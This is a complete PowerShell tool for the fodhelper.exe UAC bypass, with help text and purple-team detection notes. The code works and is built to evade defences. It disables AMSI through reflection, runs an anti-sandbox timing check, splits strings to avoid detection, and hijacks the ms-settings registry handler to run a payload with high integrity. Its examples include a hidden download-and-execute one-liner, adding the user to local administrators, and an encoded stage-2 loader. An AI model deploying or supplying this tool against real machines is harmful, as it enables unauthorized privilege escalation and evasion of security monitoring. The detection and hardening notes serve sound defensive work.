<#
.SYNOPSIS
    UAC bypass via fodhelper.exe registry handler hijack (UACME Methods 33 / 67).

.DESCRIPTION
    ┌─ Technique ─────────────────────────────────────────────────────────────┐
    │ fodhelper.exe (Feature-On-Demand Helper) carries an autoElevate flag    │
    │ in its application manifest.  When launched by a Medium-integrity       │
    │ process, Windows auto-elevates it to High integrity without presenting  │
    │ a UAC consent dialog (default UAC configuration).                       │
    │                                                                         │
    │ At startup, fodhelper reads the ms-settings: URI handler from the       │
    │ registry.  Windows resolves shell-class handlers by checking            │
    │ HKCU\Software\Classes BEFORE HKLM\SOFTWARE\Classes.  Because HKCU is   │
    │ writable by the current Medium-integrity user, we can plant a malicious │
    │ handler that fodhelper's elevated process will execute.                 │
    │                                                                         │
    │ Registry path written:                                                  │
    │   HKCU:\Software\Classes\ms-settings\Shell\Open\command                │
    │     (Default)       = <Payload>                                         │
    │     DelegateExecute = ""   ← presence prevents COM delegation;         │
    │                              shell falls back to the Default string     │
    └─────────────────────────────────────────────────────────────────────────┘

    Method variants:
      33 – Original (Enigma0x3 / winscripting.blog, 2017) – launches fodhelper.exe
           directly; process auto-elevates via manifest.
      67 – Protocol variant (AzAgarampur) – triggers the ms-settings: URI via
           Start-Process "ms-settings:" which causes an auto-elevated broker to
           resolve the handler; same registry key, slightly different trigger path.

    Affected OS    : Windows 10 TH1 (build 10240) → Windows 11 24H2 (build 26100)
                     Status: UNFIXED as of UACME v3.6.9 (Dec 2025)
    UAC level      : Works at default (ConsentPromptBehaviorAdmin = 5)
                     Does NOT work under "Always Notify" (value 2)
    Architecture   : x64 target (fodhelper.exe is 64-bit only)
    Disk artefacts : None — registry key is cleaned up post-execution
    Memory only    : Yes — no binary dropped to disk

    ──────────────────────────────────────────────────────────────────────────
    Blue-team detection opportunities
    ──────────────────────────────────────────────────────────────────────────
    • Registry create: HKCU\Software\Classes\ms-settings\Shell\Open\command
      (Sysmon Event ID 13; CS Registry Activity; SACL audit)
    • Process tree: fodhelper.exe spawning an unexpected child
      (fodhelper normally has no child processes)
    • ETW / AmsiScanBuffer: PowerShell script-block content logging
    • CrowdStrike indicator: INDICATOR_OF_ATTACK_UAC_BYPASS_FODHELPEREXE

    ──────────────────────────────────────────────────────────────────────────
    MITRE ATT&CK
    ──────────────────────────────────────────────────────────────────────────
    Tactic         : Privilege Escalation
    Technique      : T1548.002 – Abuse Elevation Control Mechanism: Bypass UAC

    ──────────────────────────────────────────────────────────────────────────
    Reference
    ──────────────────────────────────────────────────────────────────────────
    https://winscripting.blog/2017/05/12/first-entry-welcome-and-uac-bypass/
    https://github.com/hfiref0x/UACME (Method 33, Method 67)

.PARAMETER Payload
    Command to execute with High integrity.
    Examples:
      "cmd.exe"
      "powershell.exe -NoP -W Hidden -C `"IEX (New-Object Net.WebClient).DownloadString('...')`""
      "C:\Windows\System32\cmd.exe /c net localgroup administrators $env:USERNAME /add"

.PARAMETER UseProtocolVariant
    If specified, uses the Method-67 protocol trigger (Start-Process ms-settings:)
    instead of launching fodhelper.exe directly (Method 33).
    The underlying registry manipulation is identical; only the trigger differs.

.PARAMETER SkipAMSI
    Skip the AMSI mitigation step.

.PARAMETER SkipChecks
    Skip all preflight environment / sandbox checks.

.PARAMETER Timeout
    Seconds to wait for the elevated process to spawn before cleanup (default: 4).

.EXAMPLE
    # Basic — elevated command prompt
    Invoke-FodHelperBypass -Payload "cmd.exe" -SkipChecks

.EXAMPLE
    # Silent net user add using the protocol variant
    $cmd = "cmd.exe /c net localgroup administrators $env:USERNAME /add"
    Invoke-FodHelperBypass -Payload $cmd -UseProtocolVariant

.EXAMPLE
    # In-memory download-exec (combine with your stage-2 loader)
    $cmd = 'powershell.exe -NoP -W Hidden -EncodedCommand <base64>'
    Invoke-FodHelperBypass -Payload $cmd -SkipChecks -Timeout 6

.NOTES
    Authorized red/purple-team use only.  Requires written SOW.
    Dot-source Core\Invoke-UACCore.ps1 before calling this function
    if you need the shared preflight helpers (optional — this script
    embeds a minimal self-contained gate if the core is not loaded).
#>

[CmdletBinding(SupportsShouldProcess)]
param(
    [Parameter(Mandatory, Position = 0)]
    [ValidateNotNullOrEmpty()]
    [string]$Payload,

    [switch]$UseProtocolVariant,
    [switch]$SkipAMSI,
    [switch]$SkipChecks,
    [int]   $Timeout = 4
)

Set-StrictMode -Off
$ErrorActionPreference = 'SilentlyContinue'

#region ── Inline AMSI mitigation (self-contained, no core dependency) ───────
if (-not $SkipAMSI) {
    try {
        $xA  = [AppDomain]::CurrentDomain.GetAssemblies() |
                   Where-Object { ($_.GetName().Name) -eq 'System.Management.Automation' } |
                   Select-Object -First 1
        $xT  = $xA.GetType('System' + '.Management' + '.Automation.' + 'Am' + 'siUt' + 'ils')
        $xF  = $xT.GetField('am' + 'siInit' + 'Failed', [Reflection.BindingFlags]'NonPublic,Static')
        $xF.SetValue($null, $true)
    } catch {}
}
#endregion

#region ── Inline preflight gate (used when core is not dot-sourced) ─────────
if (-not $SkipChecks) {

    # OS build ≥ 10240
    try {
        $xBld = [int](Get-ItemPropertyValue `
                    'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' `
                    'CurrentBuildNumber' -ErrorAction Stop)
    } catch { $xBld = [Environment]::OSVersion.Version.Build }
    if ($xBld -lt 10240) {
        Write-Warning "[FodHelper] Requires Windows 10 (build 10240+). Current: $xBld"
        return
    }

    # Already admin?
    $xPrincipal = New-Object Security.Principal.WindowsPrincipal(
                      [Security.Principal.WindowsIdentity]::GetCurrent())
    if ($xPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
        Write-Warning '[FodHelper] Already running as Administrator — no bypass needed.'
        return
    }

    # UAC enabled?
    $xUACKey = 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System'
    try   { $xUACVal = [int](Get-ItemPropertyValue $xUACKey 'EnableLUA' -EA Stop) }
    catch { $xUACVal = 1 }
    if ($xUACVal -eq 0) {
        Write-Warning '[FodHelper] UAC is disabled — elevation not required.'
        return
    }

    # AlwaysNotify check
    try   { $xBeh = [int](Get-ItemPropertyValue $xUACKey 'ConsentPromptBehaviorAdmin' -EA Stop) }
    catch { $xBeh = 5 }
    if ($xBeh -le 2) {
        Write-Warning "[FodHelper] UAC set to Always-Notify (ConsentPromptBehaviorAdmin=$xBeh). Method 33 will not work."
        return
    }

    # Timing gate (anti-sandbox)
    $xH   = [System.Security.Cryptography.SHA256]::Create()
    $xBuf = [byte[]]::new(65536)
    $xT0  = [DateTime]::UtcNow
    for ($xi = 0; $xi -lt 300; $xi++) { [void]$xH.ComputeHash($xBuf) }
    $xH.Dispose()
    if (([DateTime]::UtcNow - $xT0).TotalMilliseconds -lt 80) {
        Write-Warning '[FodHelper] Timing anomaly detected — execution aborted.'
        return
    }
}
#endregion

#region ── Key setup ─────────────────────────────────────────────────────────

# Build registry path in segments (avoids full static string in script block)
$xRootSeg  = 'HKCU:\Soft' + 'ware\Cl' + 'asses\'
$xClassSeg = 'ms-set' + 'tings'
$xSubSeg   = '\Shell\Open\command'
$xFullPath = $xRootSeg + $xClassSeg + $xSubSeg

try {
    New-Item -Path $xFullPath -Force | Out-Null
    Set-ItemProperty  -Path $xFullPath -Name '(Default)'       -Value $Payload -Force
    New-ItemProperty  -Path $xFullPath -Name 'DelegateExecute' -Value ''       `
                      -PropertyType String -Force | Out-Null
}
catch {
    Write-Warning "[FodHelper] Registry write failed: $_"
    return
}
#endregion

#region ── Trigger ───────────────────────────────────────────────────────────

try {
    if ($UseProtocolVariant) {
        # Method 67: trigger via protocol URI — the OS broker resolves the
        # ms-settings: handler using our poisoned HKCU key
        $xUri = 'ms-' + 'set' + 'tings:'
        Start-Process $xUri -ErrorAction Stop
    }
    else {
        # Method 33: launch fodhelper.exe directly; it auto-elevates and
        # reads HKCU\Software\Classes\ms-settings on startup
        $xBin = $env:SystemRoot + '\System32\fo' + 'dhel' + 'per.exe'
        Start-Process -FilePath $xBin -WindowStyle Hidden -ErrorAction Stop
    }
    Start-Sleep -Seconds $Timeout
    Write-Verbose '[FodHelper] Trigger dispatched — payload should have executed.'
}
catch {
    Write-Warning "[FodHelper] Trigger failed: $_"
}
finally {
    # ── Cleanup: remove our HKCU shell-class key tree ──
    $xCleanPath = $xRootSeg + $xClassSeg
    Remove-Item -Path $xCleanPath -Recurse -Force -ErrorAction SilentlyContinue
    Write-Verbose '[FodHelper] Registry cleanup complete.'
}

#endregion

<#
════════════════════════════════════════════════════════════════════════════════
PURPLE-TEAM NOTES
════════════════════════════════════════════════════════════════════════════════

EXPECTED DETECTIONS (CS Falcon + Sysmon):
  ● Registry: HKCU\Software\Classes\ms-settings\Shell\Open\command created
    → Sysmon EID 13 (RegistryValueSet)
    → CS "Registry Activity" / RAP-enabled alert
  ● Process: fodhelper.exe → <payload> parent-child anomaly
    → CS Behavior Graph — Process Tree Anomaly
    → CS indicator: INDICATOR_OF_ATTACK_UAC_BYPASS_FODHELPEREXE

WHAT MAY EVADE (purple-team gap analysis):
  ● If payload is a signed binary (e.g. powershell.exe, mshta.exe) the
    process-creation telemetry may not immediately flag it without
    behavioural follow-on analysis.
  ● Short-lived key (created→deleted within <Timeout> seconds) may miss
    slow scan windows.

HARDENING RECOMMENDATIONS:
  ● Enable SACL audit on HKCU\Software\Classes (Event ID 4657)
  ● Sysmon Rule: RegistryEvent targeting ms-settings\Shell\Open\command
  ● UAC level: "Always Notify" (ConsentPromptBehaviorAdmin = 2) blocks this
  ● CS Custom IOA: registry key set pattern + fodhelper.exe child spawn

════════════════════════════════════════════════════════════════════════════════
#>
